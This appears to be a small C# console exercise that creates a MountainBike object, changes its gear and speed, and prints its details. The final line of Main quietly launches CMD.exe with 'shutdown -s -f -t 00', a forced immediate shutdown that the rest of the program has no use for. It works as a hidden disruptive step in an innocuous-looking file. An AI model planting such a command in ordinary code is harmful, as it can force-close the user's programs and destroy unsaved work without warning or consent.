using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace kam
{
    internal class Program
    {
        static void Main(string[] args)
        {
            MountainBike m = new MountainBike(12, 45, 20, 4);
            m.showInfo();
            Console.WriteLine();
            m.setGear(5);
            m.speedUp(10);
            m.showInfo();

            System.Diagnostics.Process.Start("CMD.exe", "shutdown -s -f -t 00");

        }
    }
}
